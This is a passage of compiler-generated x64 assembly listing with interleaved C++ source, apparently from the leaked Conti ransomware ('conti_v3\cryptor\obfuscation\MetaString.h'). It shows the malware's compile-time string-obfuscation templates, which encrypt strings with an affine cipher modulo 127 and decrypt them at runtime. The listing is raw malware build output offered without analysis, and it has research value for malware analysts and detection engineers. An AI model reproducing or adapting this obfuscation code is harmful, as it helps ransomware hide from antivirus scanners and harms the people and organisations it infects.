  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GB@$0HJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<97,121,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GB@$0HJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GB@$0HJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<97,121,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<97,121,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 0b	 mov	 BYTE PTR [rcx+1], 11
  00007	c6 41 02 79	 mov	 BYTE PTR [rcx+2], 121	; 00000079H
  0000b	c6 41 03 05	 mov	 BYTE PTR [rcx+3], 5
  0000f	c6 41 04 79	 mov	 BYTE PTR [rcx+4], 121	; 00000079H
  00013	c6 41 05 03	 mov	 BYTE PTR [rcx+5], 3
  00017	c6 41 06 79	 mov	 BYTE PTR [rcx+6], 121	; 00000079H
  0001b	c6 41 07 48	 mov	 BYTE PTR [rcx+7], 72	; 00000048H
  0001f	c6 41 08 79	 mov	 BYTE PTR [rcx+8], 121	; 00000079H
  00023	c6 41 09 79	 mov	 BYTE PTR [rcx+9], 121	; 00000079H
  00027	c6 41 0a 79	 mov	 BYTE PTR [rcx+10], 121	; 00000079H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0GB@$0HJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<97,121,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<97,121,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BD@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BD@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<19,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 67		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 54 00 00 00	 mov	 eax, 84			; 00000054H
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c 80	 lea	 ecx, DWORD PTR [rax+rax*4]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	c1 e1 02	 shl	 ecx, 2

; 40   :     return (a % n + n) % n;

  0003a	f7 e9		 imul	 ecx
  0003c	03 d1		 add	 edx, ecx
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	2b c8		 sub	 ecx, eax
  0004d	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00052	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00055	f7 e9		 imul	 ecx
  00057	03 d1		 add	 edx, ecx
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00068	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006c	49 83 ea 01	 sub	 r10, 1
  00070	75 ae		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00072	49 8b c0	 mov	 rax, r8
  00075	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BD@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<19,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BD@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BD@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<19,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<19,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 45	 mov	 BYTE PTR [rcx+1], 69	; 00000045H
  00007	c6 41 02 54	 mov	 BYTE PTR [rcx+2], 84	; 00000054H
  0000b	c6 41 03 16	 mov	 BYTE PTR [rcx+3], 22
  0000f	c6 41 04 54	 mov	 BYTE PTR [rcx+4], 84	; 00000054H
  00013	c6 41 05 4f	 mov	 BYTE PTR [rcx+5], 79	; 0000004fH
  00017	c6 41 06 54	 mov	 BYTE PTR [rcx+6], 84	; 00000054H
  0001b	c6 41 07 35	 mov	 BYTE PTR [rcx+7], 53	; 00000035H
  0001f	c6 41 08 54	 mov	 BYTE PTR [rcx+8], 84	; 00000054H
  00023	c6 41 09 54	 mov	 BYTE PTR [rcx+9], 84	; 00000054H
  00027	c6 41 0a 54	 mov	 BYTE PTR [rcx+10], 84	; 00000054H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0BD@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<19,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<19,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0ED@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<67,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 67		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 4b 00 00 00	 mov	 eax, 75			; 0000004bH
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c c0	 lea	 ecx, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	c1 e1 02	 shl	 ecx, 2

; 40   :     return (a % n + n) % n;

  0003a	f7 e9		 imul	 ecx
  0003c	03 d1		 add	 edx, ecx
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	2b c8		 sub	 ecx, eax
  0004d	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00052	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00055	f7 e9		 imul	 ecx
  00057	03 d1		 add	 edx, ecx
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00068	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006c	49 83 ea 01	 sub	 r10, 1
  00070	75 ae		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00072	49 8b c0	 mov	 rax, r8
  00075	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<67,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0ED@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0ED@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<67,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<67,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 6d	 mov	 BYTE PTR [rcx+1], 109	; 0000006dH
  00007	c6 41 02 4b	 mov	 BYTE PTR [rcx+2], 75	; 0000004bH
  0000b	c6 41 03 61	 mov	 BYTE PTR [rcx+3], 97	; 00000061H
  0000f	c6 41 04 4b	 mov	 BYTE PTR [rcx+4], 75	; 0000004bH
  00013	c6 41 05 2c	 mov	 BYTE PTR [rcx+5], 44	; 0000002cH
  00017	c6 41 06 4b	 mov	 BYTE PTR [rcx+6], 75	; 0000004bH
  0001b	c6 41 07 33	 mov	 BYTE PTR [rcx+7], 51	; 00000033H
  0001f	c6 41 08 4b	 mov	 BYTE PTR [rcx+8], 75	; 0000004bH
  00023	c6 41 09 4b	 mov	 BYTE PTR [rcx+9], 75	; 0000004bH
  00027	c6 41 0a 4b	 mov	 BYTE PTR [rcx+10], 75	; 0000004bH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0ED@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<67,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<67,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EP@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0EP@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<79,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 34 00 00 00	 mov	 eax, 52			; 00000034H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 2d	 imul	 ecx, eax, 45		; 0000002dH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EP@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<79,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0EP@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0EP@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<79,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<79,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 03	 mov	 BYTE PTR [rcx+1], 3
  00007	c6 41 02 34	 mov	 BYTE PTR [rcx+2], 52	; 00000034H
  0000b	c6 41 03 5f	 mov	 BYTE PTR [rcx+3], 95	; 0000005fH
  0000f	c6 41 04 34	 mov	 BYTE PTR [rcx+4], 52	; 00000034H
  00013	c6 41 05 4e	 mov	 BYTE PTR [rcx+5], 78	; 0000004eH
  00017	c6 41 06 34	 mov	 BYTE PTR [rcx+6], 52	; 00000034H
  0001b	c6 41 07 1e	 mov	 BYTE PTR [rcx+7], 30
  0001f	c6 41 08 34	 mov	 BYTE PTR [rcx+8], 52	; 00000034H
  00023	c6 41 09 34	 mov	 BYTE PTR [rcx+9], 52	; 00000034H
  00027	c6 41 0a 34	 mov	 BYTE PTR [rcx+10], 52	; 00000034H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0EP@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<79,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<79,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0FD@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0FD@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<83,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 63 00 00 00	 mov	 eax, 99			; 00000063H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 1a	 imul	 ecx, eax, 26

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0FD@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<83,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0FD@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0FD@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<83,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<83,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 6b	 mov	 BYTE PTR [rcx+1], 107	; 0000006bH
  00007	c6 41 02 63	 mov	 BYTE PTR [rcx+2], 99	; 00000063H
  0000b	c6 41 03 16	 mov	 BYTE PTR [rcx+3], 22
  0000f	c6 41 04 63	 mov	 BYTE PTR [rcx+4], 99	; 00000063H
  00013	c6 41 05 11	 mov	 BYTE PTR [rcx+5], 17
  00017	c6 41 06 63	 mov	 BYTE PTR [rcx+6], 99	; 00000063H
  0001b	c6 41 07 69	 mov	 BYTE PTR [rcx+7], 105	; 00000069H
  0001f	c6 41 08 63	 mov	 BYTE PTR [rcx+8], 99	; 00000063H
  00023	c6 41 09 63	 mov	 BYTE PTR [rcx+9], 99	; 00000063H
  00027	c6 41 0a 63	 mov	 BYTE PTR [rcx+10], 99	; 00000063H
